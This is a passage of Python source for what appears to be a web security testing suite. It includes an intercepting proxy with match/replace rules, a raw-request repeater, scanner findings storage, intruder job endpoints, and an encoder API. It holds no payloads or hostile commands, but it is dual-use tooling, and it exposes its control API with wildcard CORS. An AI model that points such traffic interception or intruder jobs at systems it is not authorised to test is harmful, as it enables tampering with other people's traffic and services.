                    messages.append(remaining[:total_length])
                    remaining = remaining[total_length:]
                    continue

            # Can't extract more messages
            break

        return messages, remaining

    def _apply_match_replace(self, data: bytes, data_type: str) -> bytes:
        """Apply match/replace rules to data"""
        result = data

        for rule in self.match_replace_rules:
            if not rule.get('enabled', True):
                continue

            if rule.get('type') not in [data_type, 'both']:
                continue

            try:
                pattern = rule['match']
                replacement = rule['replace']

                # Convert to string for regex replacement
                text = result.decode('latin-1', errors='ignore')
                modified = re.sub(pattern, replacement, text)
                result = modified.encode('latin-1')

            except Exception as e:
                logger.error(f"Match/replace error: {e}")

        return result

    def _apply_filters(self, data: bytes, data_type: str, host: str) -> bool:
        """Apply filter rules to data"""
        for rule in self.filter_rules:
            if not rule.get('enabled', True):
                continue

            if rule.get('type') not in [data_type, 'both']:
                continue

            try:
                pattern = rule['pattern']
                action = rule.get('action', 'drop')

                # Convert to string for pattern matching
                text = data.decode('latin-1', errors='ignore')

                if re.search(pattern, text, re.IGNORECASE):
                    if action == 'drop':
                        return True
                    elif action == 'log':
                        logger.info(f"Filter matched for {host}: {rule.get('description')}")

            except Exception as e:
                logger.error(f"Filter error: {e}")

        return False

    def _intercept_request(self, data: bytes, client_address: tuple) -> Optional[bytes]:
        """Intercept and potentially modify request"""
        if not self.intercept_enabled:
            return data

        req_id = str(uuid.uuid4())

        with self.queue_lock:
            self.intercept_queue[req_id] = {
                'id': req_id,
                'type': 'request',
                'data': data,
                'client_address': client_address,
                'timestamp': datetime.now(timezone.utc).isoformat(),
                'decision': None,
                'modified': data
            }

        # Wait for decision (with timeout)
        timeout = 30  # seconds
        start_time = time.time()

        while time.time() - start_time < timeout:
            with self.queue_lock:
                item = self.intercept_queue.get(req_id)
                if item and item['decision'] is not None:
                    decision = item['decision']
                    modified = item['modified']

                    # Remove from queue
                    del self.intercept_queue[req_id]

                    if decision == 'forward':
                        return modified
                    elif decision == 'drop':
                        return None

            time.sleep(0.1)

        # Timeout - remove from queue and drop
        with self.queue_lock:
            if req_id in self.intercept_queue:
                del self.intercept_queue[req_id]

        return None

    def _intercept_response(self, data: bytes, client_address: tuple) -> Optional[bytes]:
        """Intercept and potentially modify response"""
        if not self.intercept_enabled:
            return data

        req_id = str(uuid.uuid4())

        with self.queue_lock:
            self.intercept_queue[req_id] = {
                'id': req_id,
                'type': 'response',
                'data': data,
                'client_address': client_address,
                'timestamp': datetime.now(timezone.utc).isoformat(),
                'decision': None,
                'modified': data
            }

        # Wait for decision (with timeout)
        timeout = 30
        start_time = time.time()

        while time.time() - start_time < timeout:
            with self.queue_lock:
                item = self.intercept_queue.get(req_id)
                if item and item['decision'] is not None:
                    decision = item['decision']
                    modified = item['modified']

                    # Remove from queue
                    del self.intercept_queue[req_id]

                    if decision == 'forward':
                        return modified
                    elif decision == 'drop':
                        return None

            time.sleep(0.1)

        # Timeout - remove from queue and forward
        with self.queue_lock:
            if req_id in self.intercept_queue:
                del self.intercept_queue[req_id]

        return data

    def _process_intercept_queue(self):
        """Process intercept queue (background thread)"""
        while self.running:
            time.sleep(0.1)
            # Queue processing is handled by UI via API

    def _save_request(self, scheme: str, host: str, port: int,
                      request_save: bytes, response: Optional[bytes],
                      client_address: tuple):
        """Save request/response to database"""
        try:
            # Parse data first (CPU intensive, do outside lock)
            parsed_request = HTTPParser.parse_request(request_save)
            if not parsed_request:
                return

            parsed_response = None
            if response:
                parsed_response = HTTPParser.parse_response(response)

            # Use execute_with_lock for the database operation
            req_id = str(uuid.uuid4())

            db_manager.execute_with_lock("""
                INSERT INTO requests 
                (id, project_id, timestamp, method, scheme, host, port, path, query,
                 headers, body, raw_request, response_code, response_headers,
                 response_body, raw_response, response_time, request_size,
                 response_size, mime_type, content_type, source_ip)
                VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)
            """, (
                req_id,
                'default',  # or get from context
                datetime.now(timezone.utc).isoformat(),
                parsed_request['method'],
                scheme,
                host,
                port,
                parsed_request['path'],
                parsed_request['query'],
                json.dumps(parsed_request['headers']),
                parsed_request['body'],
                request_save,
                parsed_response['status_code'] if parsed_response else None,
                json.dumps(parsed_response['headers']) if parsed_response else '[]',
                parsed_response['body'] if parsed_response else None,
                response if response else None,
                0.1,  # Placeholder
                len(request_save),
                len(response) if response else 0,
                parsed_response['content_type'] if parsed_response else None,
                parsed_request['content_type'],
                client_address[0]
            ))

            # Update stats (no database lock needed)
            self.stats['requests_processed'] += 1
            if response:
                self.stats['responses_processed'] += 1
            self.stats['bytes_transferred'] += len(request_save) + (len(response) if response else 0)

        except Exception as e:
            logger.error(f"Failed to save request: {e}")

    def _auto_scan(self, request_auto_scan: Dict, response: Dict, project_id: str):
        """Auto-scan request/response for vulnerabilities"""
        try:
            findings = scanner.scan_request(request_auto_scan, response, project_id)

            if findings:
                logger.info(f"Found {len(findings)} vulnerabilities in auto-scan")

                # Save findings to database
                conn = db_manager.get_connection()
                cursor = conn.cursor()

                for finding in findings:
                    cursor.execute("""
                        INSERT INTO scanner_findings 
                        (id, project_id, request_id,timestamp, issue_type, severity, confidence,
                         url, host, path, parameter, description, detail, remediation,
                         evidence, request, response, cvss_score, status)
                        VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)
                    """, (
                        finding['id'],
                        project_id,
                        None,
                        finding['timestamp'],
                        finding['issue_type'],
                        finding['severity'],
                        finding['confidence'],
                        finding.get('url', ''),
                        request_auto_scan.get('host', ''),
                        request_auto_scan.get('path', ''),
                        finding.get('parameter', 'N/A'),
                        finding['description'],
                        finding['detail'],
                        finding['remediation'],
                        finding['evidence'],
                        json.dumps(request),
                        json.dumps(response),
                        finding.get('cvss_score', 0),
                        'open'
                    ))

                conn.commit()

        except Exception as e:
            logger.error(f"Auto-scan failed: {e}")

    def get_intercept_items(self) -> List[Dict]:
        """Get items waiting for interception"""
        with self.queue_lock:
            items = []
            for req_id, item in self.intercept_queue.items():
                if item['decision'] is None:
                    # Decode data for display
                    try:
                        data_str = item['data'].decode('utf-8', errors='ignore')
                    except:
                        data_str = item['data'].decode('latin-1', errors='ignore')

                    items.append({
                        'id': req_id,
                        'type': item['type'],
                        'data': data_str,
                        'client_address': item['client_address'],
                        'timestamp': item['timestamp']
                    })

            return items

    def process_intercept(self, req_id: str, decision: str, modified_data: str = None):
        """Process interception decision"""
        with self.queue_lock:
            if req_id in self.intercept_queue:
                item = self.intercept_queue[req_id]
                item['decision'] = decision

                if decision == 'forward' and modified_data:
                    item['modified'] = modified_data.encode('latin-1')

    def get_stats(self) -> Dict:
        """Get proxy statistics"""
        return {
            **self.stats,
            'intercept_queue_size': len(self.intercept_queue),
            'client_threads': len([t for t in self.client_threads if t.is_alive()]),
            'running': self.running,
            'intercept_enabled': self.intercept_enabled
        }

    def toggle_intercept(self, enabled: bool = None):
        """Toggle interception"""
        if enabled is None:
            self.intercept_enabled = not self.intercept_enabled
        else:
            self.intercept_enabled = enabled

        logger.info(f"Intercept {'enabled' if self.intercept_enabled else 'disabled'}")
        return self.intercept_enabled

    def add_match_replace_rule(self, rule: Dict):
        """Add match/replace rule"""
        self.match_replace_rules.append(rule)

    def remove_match_replace_rule(self, index_r: int):
        """Remove match/replace rule"""
        if 0 <= index_r < len(self.match_replace_rules):
            del self.match_replace_rules[index_r]

    def add_filter_rule(self, rule: Dict):
        """Add filter rule"""
        self.filter_rules.append(rule)

    def remove_filter_rule(self, index_f: int):
        """Remove filter rule"""
        if 0 <= index_f < len(self.filter_rules):
            del self.filter_rules[index_f]


proxy = ProxyEngine()

# =================================================================
# FLASK APPLICATION
# =================================================================

app = Flask(__name__, static_folder='static', template_folder='templates')
app.secret_key = secrets.token_hex(32)


# CORS headers
@app.after_request
def add_cors_headers(response):
    """Add CORS headers to responses"""
    response.headers['Access-Control-Allow-Origin'] = '*'
    response.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS'
    response.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization'
    return response


# Error handlers
@app.errorhandler(404)
def not_found(error):
    return jsonify({'error': 'Not found'}), 404


@app.errorhandler(500)
def internal_error(error):
    logger.error(f"Internal error: {error}")
    return jsonify({'error': 'Internal server error'}), 500


# =================================================================
# API ROUTES
# =================================================================

@app.route('/')
def index():
    """Serve main UI"""
    return render_template_string(ADVANCED_UI_TEMPLATE)


def parse_raw_http_request(raw: str):
    """Parse raw HTTP request with improved error handling and validation"""
    lines = raw.splitlines()
    if not lines:
        raise ValueError("Empty request")

    # Parse request line
    request_line_parts = lines[0].split(" ", 2)
    if len(request_line_parts) < 3:
        raise ValueError("Invalid request line")

    method, path, version = request_line_parts
    if not method or not path or not version:
        raise ValueError("Invalid request line")

    headers = {}
    i = 1

    # Parse headers
    while i < len(lines) and lines[i].strip():
        if ": " not in lines[i] and ":" not in lines[i]:
            i += 1
            continue

        try:
            if ": " in lines[i]:
                key, val = lines[i].split(": ", 1)
            else:
                key, val = lines[i].split(":", 1)
            headers[key.strip()] = val.strip()
        except ValueError:
            pass
        i += 1

    # Parse body
    body_lines = []
    i += 1  # Skip empty line after headers
    while i < len(lines):
        body_lines.append(lines[i])
        i += 1
    body = "\n".join(body_lines)

    # Extract host from Host header or URL
    host = headers.get("Host")
    if not host and path.startswith("http"):
        try:
            parsed_url = urlparse(path)
            host = parsed_url.netloc
        except:
            pass

    if not host:
        raise ValueError("Host header missing or could not be determined")

    # Determine port
    port = None
    if ":" in host:
        host, port_str = host.split(":", 1)
        try:
            port = int(port_str)
        except ValueError:
            port = None

    if not port:
        # Check scheme from URL or default to https for port 443
        if path.startswith("https://"):
            port = 443
        else:
            port = 80

    # Clean up path if it's a full URL
    if path.startswith("http"):
        try:
            parsed = urlparse(path)
            path = parsed.path
            if parsed.query:
                path += "?" + parsed.query
        except:
            pass

    return {
        "method": method,
        "host": host,
        "port": port,
        "path": path,
        "headers": headers,
        "body": body,
        "version": version
    }


def decode_chunked_response(data: bytes) -> bytes:
    """Decode chunked transfer encoding"""
    result = b""
    idx = 0
    length = len(data)

    while idx < length:
        # Find chunk size line
        chunk_size_end = data.find(b"\r\n", idx)
        if chunk_size_end == -1:
            break

        chunk_size_line = data[idx:chunk_size_end]
        try:
            # Parse hex chunk size
            chunk_size = int(chunk_size_line.split(b";")[0], 16)
        except ValueError:
            break

        if chunk_size == 0:
            # Last chunk
            break

        idx = chunk_size_end + 2  # Skip \r\n
        chunk_end = idx + chunk_size

        if chunk_end > length:
            break

        result += data[idx:chunk_end]
        idx = chunk_end + 2  # Skip \r\n after chunk

    return result


def decompress_body(body: bytes, encoding: str) -> bytes:
    """Decompress body based on Content-Encoding header"""
    if not body:
        return body

    encoding = encoding.lower().strip()

    try:
        if encoding == "gzip":
            return gzip.decompress(body)
        elif encoding == "deflate":
            # Try zlib decompression with different window bits
            try:
                return zlib.decompress(body, -zlib.MAX_WBITS)
            except zlib.error:
                try:
                    return zlib.decompress(body)
                except zlib.error:
                    return body
        elif encoding == "br":
            try:
                import brotli
                return brotli.decompress(body)
            except (ImportError, brotli.error):
                return body
        elif encoding == "identity" or not encoding:
            return body
        else:
            # Unknown encoding, return as-is
            return body
    except Exception:
        return body


def parse_http_response(response_bytes: bytes, decode: bool = True):
    """Parse HTTP response with proper handling of headers and body"""
    if not response_bytes:
        return {"status": 0, "headers": {}, "body": "", "raw_headers": "", "body_size": 0}

    # Find end of headers
    header_end = response_bytes.find(b"\r\n\r\n")
    if header_end == -1:
        return {"status": 0, "headers": {}, "body": "", "raw_headers": "", "body_size": 0}

    raw_headers = response_bytes[:header_end].decode('latin-1', errors='replace')
    body_start = header_end + 4
    body_bytes = response_bytes[body_start:]

    # Parse status line
    status_line_end = raw_headers.find("\r\n")
    if status_line_end == -1:
        status_line = raw_headers
    else:
        status_line = raw_headers[:status_line_end]

    # Extract status code
    status_match = re.search(r'HTTP/\d\.\d\s+(\d+)', status_line)
    status_code = int(status_match.group(1)) if status_match else 0

    # Parse headers
    headers = {}
    raw_headers_list = raw_headers.split("\r\n")[1:]  # Skip status line
    for header in raw_headers_list:
        if ": " in header:
            key, value = header.split(": ", 1)
            headers[key.strip()] = value.strip()

    # Handle Transfer-Encoding: chunked
    transfer_encoding = headers.get("Transfer-Encoding", "").lower()
    if "chunked" in transfer_encoding and decode:
        try:
            body_bytes = decode_chunked_response(body_bytes)
        except Exception:
            pass

    # Handle Content-Encoding
    content_encoding = headers.get("Content-Encoding", "")
    if content_encoding and decode:
        body_bytes = decompress_body(body_bytes, content_encoding)

    # Decode body to text if it's likely text
    body_text = ""
    content_type = headers.get("Content-Type", "").lower()

    if decode and body_bytes:
        if "text/" in content_type or \
                "application/json" in content_type or \
                "application/xml" in content_type or \
                "application/javascript" in content_type or \
                "application/xhtml+xml" in content_type:
            try:
                # Try UTF-8 first
                body_text = body_bytes.decode('utf-8', errors='replace')
            except UnicodeDecodeError:
                try:
                    # Try latin-1 as fallback
                    body_text = body_bytes.decode('latin-1', errors='replace')
                except UnicodeDecodeError:
                    # If all else fails, show hex
                    body_text = body_bytes.hex()
        else:
            # For binary content, show hex preview or size
            body_text = f"[Binary data - {len(body_bytes)} bytes]"

    return {
        "status": status_code,
        "headers": headers,
        "body": body_text,
        "raw_headers": raw_headers,
        "body_bytes": body_bytes,
        "body_size": len(body_bytes),
        "content_type": content_type
    }


def send_raw_request(req, timeout=10):
    """Send HTTP request with improved error handling and features"""
    is_https = req["port"] == 443

    try:
        # Create socket connection
        sock = socket.create_connection((req["host"], req["port"]), timeout=timeout)

        if is_https:
            context = ssl.create_default_context()
            # Enable Server Name Indication (SNI)
            sock = context.wrap_socket(sock, server_hostname=req["host"])

        # Build request
        request_line = f"{req['method']} {req['path']} {req.get('version', 'HTTP/1.1')}"

        # Prepare headers - ensure Host is included
        headers = dict(req["headers"])
        if "Host" not in headers:
            headers["Host"] = req["host"]

        # Build raw request
        raw_request = f"{request_line}\r\n"
        for k, v in headers.items():
            raw_request += f"{k}: {v}\r\n"
        raw_request += "\r\n"

        if req["body"]:
            raw_request += req["body"]

        # Send request and measure time
        start_time = time.time()
        sock.sendall(raw_request.encode("utf-8", errors="ignore"))

        # Receive response with timeout handling
        response = b""
        sock.settimeout(timeout)

        while True:
            try:
                chunk = sock.recv(65536)  # Larger buffer for better performance
                if not chunk:
                    break
                response += chunk
            except socket.timeout:
                break
            except (ConnectionResetError, BrokenPipeError):
                break

        elapsed = int((time.time() - start_time) * 1000)
        sock.close()

        return response, elapsed

    except socket.timeout:
        raise Exception(f"Connection timeout after {timeout} seconds")
    except ConnectionRefusedError:
        raise Exception(f"Connection refused by {req['host']}:{req['port']}")
    except ssl.SSLError as e:
        raise Exception(f"SSL error: {str(e)}")
    except Exception as e:
        raise Exception(f"Network error: {str(e)}")


@app.route("/api/repeater/send", methods=["POST"])
def repeater_send():
    """Enhanced repeater endpoint with better response processing"""
    try:
        data = request.get_json()
        raw_request = data.get("request", "")
        decode_response = data.get("decode", True)

        if not raw_request.strip():
            return jsonify({"error": "Empty request"}), 400

        # Parse and validate request
        parsed_request = parse_raw_http_request(raw_request)

        # Send request
        response_bytes, elapsed = send_raw_request(parsed_request)

        # Parse response
        parsed_response = parse_http_response(response_bytes, decode=decode_response)

        # Extract interesting headers for quick view
        interesting_headers = {}
        header_priority = [
            "Content-Type", "Content-Length", "Content-Encoding",
            "Transfer-Encoding", "Server", "Date", "Location",
            "Set-Cookie", "Cache-Control", "X-Powered-By"
        ]

        for header in header_priority:
            if header in parsed_response["headers"]:
                interesting_headers[header] = parsed_response["headers"][header]

        # Check for security headers
        security_headers = {}
        security_header_list = [
            "Strict-Transport-Security", "Content-Security-Policy",
            "X-Frame-Options", "X-Content-Type-Options",
            "X-XSS-Protection", "Referrer-Policy"
        ]

        for header in security_header_list:
            if header in parsed_response["headers"]:
                security_headers[header] = parsed_response["headers"][header]

        # Calculate response statistics
        response_stats = {
            "total_size": len(response_bytes),
            "body_size": parsed_response["body_size"],
            "header_count": len(parsed_response["headers"]),
            "security_headers_present": len(security_headers),
            "is_compressed": "Content-Encoding" in parsed_response["headers"],
            "is_chunked": "chunked" in parsed_response["headers"].get("Transfer-Encoding", "").lower()
        }

        return jsonify({
            "success": True,
            "request": {
                "method": parsed_request["method"],
                "host": parsed_request["host"],
                "port": parsed_request["port"],
                "path": parsed_request["path"],
                "headers_count": len(parsed_request["headers"])
            },
            "response": {
                "status": parsed_response["status"],
                "headers": parsed_response["headers"],
                "body": parsed_response["body"],
                "raw_headers": parsed_response["raw_headers"],
                "interesting_headers": interesting_headers,
                "security_headers": security_headers,
                "stats": response_stats
            },
            "timing": {
                "total_time": elapsed,
                "request_size": len(raw_request),
                "response_size": len(response_bytes)
            },
            "raw_response": response_bytes.decode('latin-1', errors='replace') if decode_response else ""
        })

    except ValueError as e:
        return jsonify({"error": f"Invalid request format: {str(e)}"}), 400
    except Exception as e:
        return jsonify({
            "error": str(e),
            "success": False,
            "response": {
                "status": 0,
                "headers": {},
                "body": "",
                "interesting_headers": {},
                "security_headers": {},
                "stats": {}
            },
            "timing": {
                "total_time": 0,
                "request_size": 0,
                "response_size": 0
            }
        }), 500


# Optional: Add endpoint for viewing response in different formats
@app.route("/api/repeater/response/format", methods=["POST"])
def format_response():
    """Format response body based on content type"""
    try:
        data = request.get_json()
        body = data.get("body", "")
        content_type = data.get("content_type", "")

        formatted = body

        # Add JSON formatting
        if "application/json" in content_type:
            try:
                import json
                parsed = json.loads(body)
                formatted = json.dumps(parsed, indent=2, ensure_ascii=False)
            except:
                pass

        # Add HTML formatting
        elif "text/html" in content_type:
            try:
                from bs4 import BeautifulSoup
                soup = BeautifulSoup(body, 'html.parser')
                formatted = soup.prettify()
            except:
                pass

        # Add XML formatting
        elif "application/xml" in content_type or "text/xml" in content_type:
            try:
                import xml.dom.minidom
                dom = xml.dom.minidom.parseString(body)
                formatted = dom.toprettyxml(indent="  ")
            except:
                pass

        return jsonify({
            "success": True,
            "formatted": formatted,
            "original_length": len(body),
            "formatted_length": len(formatted)
        })

    except Exception as e:
        return jsonify({"error": str(e), "success": False}), 500


@app.route('/api/scanner/results/<result_id>/fixed', methods=['POST'])
def mark_result_fixed(result_id):
    try:
        conn = db_manager.get_connection()
        cursor = conn.cursor()

        cursor.execute("""
            UPDATE scanner_findings
            SET status = ?, fix_date = ?
            WHERE id = ?
        """, (
            'fixed',
            datetime.now(timezone.utc).isoformat(),
            result_id
        ))

        conn.commit()

        if cursor.rowcount == 0:
            return jsonify({'error': 'Result not found'}), 404

        return jsonify({
            'success': True,
            'id': result_id,
            'status': 'fixed'
        })

    except Exception as e:
        logger.error(f"Mark fixed failed: {e}")
        return jsonify({'error': 'Failed to mark as fixed'}), 500




@app.route('/api/scanner/results/<result_id>/false-positive', methods=['POST'])
def mark_result_false_positive(result_id):
    try:
        conn = db_manager.get_connection()
        cursor = conn.cursor()

        cursor.execute("""
            UPDATE scanner_findings
            SET status = ?, confidence = ?, fix_date = ?,false_positive =?
            WHERE id = ?
        """, (
            'false_positive',
            'Low',
            datetime.now(timezone.utc).isoformat(),
            1,
            result_id
        ))

        conn.commit()

        if cursor.rowcount == 0:
            return jsonify({'error': 'Result not found'}), 404

        return jsonify({
            'success': True,
            'id': result_id,
            'status': 'false_positive'
        })

    except Exception as e:
        logger.error(f"Mark false positive failed: {e}")
        return jsonify({'error': 'Failed to mark as false positive'}), 500





@app.route('/api/scanner/results/<result_id>', methods=['GET'])
def get_scan_result(result_id):
    try:
        conn = db_manager.get_connection()
        cursor = conn.cursor()

        cursor.execute("""
            SELECT *
            FROM scanner_findings
            WHERE id = ?
        """, (result_id,))

        row = cursor.fetchone()
        if not row:
            return jsonify({'error': 'Result not found'}), 404

        columns = [col[0] for col in cursor.description]
        result = dict(zip(columns, row))

        return jsonify(result)

    except Exception as e:
        logger.error(f"Failed to load scan result {result_id}: {e}")
        return jsonify({'error': 'Failed to load scan result'}), 500


@app.route('/api/status')
def api_status():
    """Get system status"""
    return jsonify({
        'proxy': {
            'running': proxy.running,
            'intercept_enabled': proxy.intercept_enabled,
            'stats': proxy.get_stats()
        },
        'scanner': {
            'active_scans': len(scanner.active_scans)
        },
        'intruder': {
            'active_jobs': len(intruder.active_jobs)
        },
        'database': db_manager.get_stats(),
        'timestamp': datetime.now(timezone.utc).isoformat()
    })


@app.route('/api/proxy/start', methods=['POST'])
def api_proxy_start():
    """Start proxy server"""
    try:
        if not proxy.running:
            proxy.start()
        return jsonify({'success': True, 'running': proxy.running})
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/proxy/stop', methods=['POST'])
def api_proxy_stop():
    """Stop proxy server"""
    try:
        if proxy.running:
            proxy.stop()
        return jsonify({'success': True, 'running': proxy.running})
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/proxy/intercept/toggle', methods=['POST'])
def api_proxy_intercept_toggle():
    """Toggle interception"""
    data = request.json
    enabled = data.get('enabled')

    if enabled is None:
        enabled = not proxy.intercept_enabled

    proxy.toggle_intercept(enabled)
    return jsonify({'success': True, 'enabled': proxy.intercept_enabled})


@app.route('/api/proxy/intercept/items')
def api_proxy_intercept_items():
    """Get intercept items"""
    items = proxy.get_intercept_items()
    return jsonify(items)


@app.route('/api/proxy/intercept/<req_id>', methods=['POST'])
def api_proxy_intercept_process(req_id):
    """Process intercept decision"""
    data = request.json
    decision = data.get('decision')  # 'forward' or 'drop'
    modified = data.get('modified')

    if decision not in ['forward', 'drop']:
        return jsonify({'error': 'Invalid decision'}), 400

    proxy.process_intercept(req_id, decision, modified)
    return jsonify({'success': True})


@app.route('/api/requests')
def api_requests():
    """Get request history"""
    try:
        project_id = request.args.get('project', 'default')
        limit = int(request.args.get('limit', 100))
        offset = int(request.args.get('offset', 0))

        conn = db_manager.get_connection()
        cursor = conn.cursor()

        cursor.execute("""
            SELECT id, timestamp, method, scheme, host, port, path,
                   response_code, request_size, response_size, response_time,
                   bookmarked, highlighted, notes
            FROM requests 
            WHERE project_id = ?
            ORDER BY datetime(timestamp) DESC
            LIMIT ? OFFSET ?
        """, (project_id, limit, offset))

        rows = cursor.fetchall()

        requests = []
        for row in rows:
            requests.append({
                'id': row[0],
                'timestamp': row[1],
                'method': row[2],
                'scheme': row[3],
                'host': row[4],
                'port': row[5],
                'path': row[6],
                'code': row[7],
                'request_size': row[8],
                'response_size': row[9],
                'response_time': round(row[10], 3) if row[10] else 0,
                'bookmarked': bool(row[11]),
                'highlighted': bool(row[12]),
                'notes': row[13] or ''
            })

        return jsonify(requests)

    except Exception as e:
        logger.error(f"Error getting requests: {e}")
        return jsonify({'error': str(e)}), 500


@app.route('/api/scanner/status/<scan_id>', methods=['GET'])
def scan_status(scan_id: str):
    return jsonify(scanner.get_scan_status(scan_id))




@app.route('/api/requests/<req_id>')
def api_request_detail(req_id):
    """Get detailed request/response"""
    try:
        conn = db_manager.get_connection()
        cursor = conn.cursor()

        cursor.execute("""
            SELECT method, scheme, host, port, path, query, fragment,
                   headers, body, raw_request, response_code, response_headers,
                   response_body, raw_response, notes, tags, comment,
                   source_ip, destination_ip, user_agent, referer
            FROM requests 
            WHERE id = ?
        """, (req_id,))

        row = cursor.fetchone()

        if not row:
            return jsonify({'error': 'Request not found'}), 404

        return jsonify({
            'method': row[0],
            'scheme': row[1],
            'host': row[2],
            'port': row[3],
            'path': row[4],
            'query': row[5],
            'fragment': row[6],
            'headers': json.loads(row[7]) if row[7] else [],
            'body': row[8].decode('utf-8', errors='ignore') if row[8] else '',
            'raw_request': base64.b64encode(row[9]).decode() if row[9] else '',
            'response_code': row[10],
            'response_headers': json.loads(row[11]) if row[11] else [],
            'response_body': row[12].decode('utf-8', errors='ignore') if row[12] else '',
            'raw_response': base64.b64encode(row[13]).decode() if row[13] else '',
            'notes': row[14] or '',
            'tags': row[15] or '',
            'comment': row[16] or '',
            'source_ip': row[17] or '',
            'destination_ip': row[18] or '',
            'user_agent': row[19] or '',
            'referer': row[20] or ''
        })

    except Exception as e:
        logger.error(f"Error getting request detail: {e}")
        return jsonify({'error': str(e)}), 500


@app.route('/api/scanner/results')
def api_scanner_results():
    """Get scanner results"""
    try:
        project_id = request.args.get('project', 'default')
        severity = request.args.get('severity')
        status = request.args.get('status')
        limit = int(request.args.get('limit', 100))
        project_id = f"scan-{project_id}"


        conn = db_manager.get_connection()
        cursor = conn.cursor()

        query = """
            SELECT id, timestamp, issue_type, severity, confidence, url,
                   host, path, parameter, description, detail, remediation,
                   evidence, cvss_score, cwe_id, owasp_category, status,
                   false_positive, verified, notes
            FROM scanner_findings 
            WHERE project_id = ?
        """

        params = [project_id]

        if severity:
            query += " AND severity = ?"
            params.append(severity)

        if status:
            query += " AND status = ?"
            params.append(status)

        query += " ORDER BY cvss_score DESC, datetime(timestamp) DESC LIMIT ?"
        params.append(limit)

        cursor.execute(query, params)
        rows = cursor.fetchall()

        results = []
        for row in rows:
            results.append({
                'id': row[0],
                'timestamp': row[1],
                'type': row[2],
                'severity': row[3],
                'confidence': row[4],
                'url': row[5],
                'host': row[6],
                'path': row[7],
                'parameter': row[8],
                'description': row[9],
                'detail': row[10],
                'remediation': row[11],
                'evidence': row[12],
                'cvss_score': float(row[13]) if row[13] else 0,
                'cwe_id': row[14] or '',
                'owasp_category': row[15] or '',
                'status': row[16] or 'open',
                'false_positive': bool(row[17]),
                'verified': bool(row[18]),
                'notes': row[19] or ''
            })

        return jsonify(results)

    except Exception as e:
        logger.error(f"Error getting scanner results: {e}")
        return jsonify({'error': str(e)}), 500


@app.route('/api/scanner/scan', methods=['POST'])
def api_scanner_scan():
    """Start a new scan"""
    try:
        data = request.json
        target_url = data.get('url')
        scan_type = data.get('type', 'full')
        project_id = data.get('project','default')

        if not target_url:
            return jsonify({'error': 'Target URL required'}), 400



        scan_id = scanner.start_scan(target_url, scan_type, project_id)

        return jsonify({
            'success': True,
            'scan_id': scan_id,
            'message': 'Scan started'

        })

    except Exception as e:
        logger.error(f"Error starting scan: {e}")
        return jsonify({'error': str(e)}), 500


@app.route('/api/intruder/jobs', methods=['GET'])
def api_intruder_jobs():
    try:
        project_id = request.args.get('project', 'default')
        status = request.args.get('status')
        limit = min(int(request.args.get('limit', 50)), 500)
        project_id = f"intruder-{project_id}"
        conn = db_manager.get_connection()
        cursor = conn.cursor()

        query = """
            SELECT id, project_id, name, description, created, modified, status,
                   attack_type, target_url, payload_count, payload_processed,
                   stats, settings
            FROM intruder_jobs
            WHERE project_id = ?
        """
        params = [project_id]

        if status:
            query += " AND status = ?"
            params.append(status)

        query += " ORDER BY created DESC LIMIT ?"
        params.append(limit)

        cursor.execute(query, params)

        jobs = []
        for row in cursor.fetchall():
            total = row[9] or 0
            processed = row[10] or 0

            jobs.append({
                'id': row[0],
                'project_id' : row[1],
                'name': row[2],
                'description': row[3] or '',
                'created': row[4],
                'modified': row[5],
                'status': row[6],
                'attack_type': row[7],
                'target_url': row[8],
                'payload_count': total,
                'payload_processed': processed,
                'progress': round(min((processed / total) * 100, 100), 2) if total else 0,
                'stats': safe_json(row[11]),
                'settings': safe_json(row[12]),
            })

        return jsonify(jobs)

    except Exception as e:
        logger.error("Error getting intruder jobs")
        return jsonify({'error': 'Internal error'}), 500

def safe_json(value, default=None, log=False):
    if default is None:
        default = {}

    if not value:
        return default

    try:
        return json.loads(value)
    except Exception as e:
        if log:
            logger.warning(f"Invalid JSON ignored: {e}")
        return default


@app.route('/api/intruder/jobs', methods=['POST'])
def api_intruder_create():
    """Create intruder job"""
    try:
        data = request.json

        job_id = intruder.create_job(data)

        return jsonify({
            'success': True,
            'job_id': job_id,
            'message': 'Job created'
        })

    except Exception as e:
        logger.error(f"Error creating intruder job: {e}")
        return jsonify({'error': str(e)}), 500


@app.route('/api/intruder/jobs/<job_id>/start', methods=['POST'])
def api_intruder_start(job_id):
    """Start intruder job"""
    try:
        intruder.start_job(job_id)
        return jsonify({'success': True})
    except Exception as e:
        logger.error(f"Error starting intruder job: {e}")
        return jsonify({'error': str(e)}), 500




def safe_json_job(obj):
    """
    Recursively convert bytes → string so jsonify() won't explode
    """
    if isinstance(obj, bytes):
        try:
            return obj.decode('utf-8', errors='replace')
        except Exception:
            return repr(obj)

    if isinstance(obj, dict):
        return {k: safe_json(v) for k, v in obj.items()}

    if isinstance(obj, list):
        return [safe_json(v) for v in obj]

    return obj

@app.route('/api/intruder/jobs/<job_id>')
def api_intruder_job_detail(job_id):
    """Get intruder job details"""
    try:
        job = intruder.get_job(job_id)
        if not job:
            return jsonify({'error': 'Job not found'}), 404

        return jsonify(safe_json_job(job))

    except Exception as e:
        logger.error(f"Error getting intruder job: {e}")
        return jsonify({'error': str(e)}), 500


@app.route('/api/decoder', methods=['POST'])
def api_decoder():
    """Encode/decode data"""
    try:
        data = request.json
        operation = data.get('operation')
        input_data = data.get('input', '')

        processor = DataProcessor()
        result = ''
        error = None

        try:
            if operation == 'base64_encode':
                result = processor.encode_base64(input_data)
            elif operation == 'base64_decode':
                result = processor.decode_base64(input_data)
            elif operation == 'base64_url_encode':
                result = processor.encode_base64_url(input_data)
            elif operation == 'base64_url_decode':
                result = processor.decode_base64_url(input_data)
            elif operation == 'url_encode':
                result = processor.url_encode(input_data)
            elif operation == 'url_decode':
                result = processor.url_decode(input_data)
            elif operation == 'html_encode':
                result = processor.html_encode(input_data)
            elif operation == 'html_decode':
                result = processor.html_decode(input_data)
            elif operation == 'hex_encode':
                result = processor.hex_encode(input_data)
            elif operation == 'hex_decode':
                result = processor.hex_decode(input_data)
            elif operation == 'rot13':
                result = processor.rot13(input_data)
            elif operation == 'rot_n':
                n = int(data.get('n', 13))
                result = processor.rot_n(input_data, n)
            elif operation == 'xor':
                key = data.get('key', 'secret')
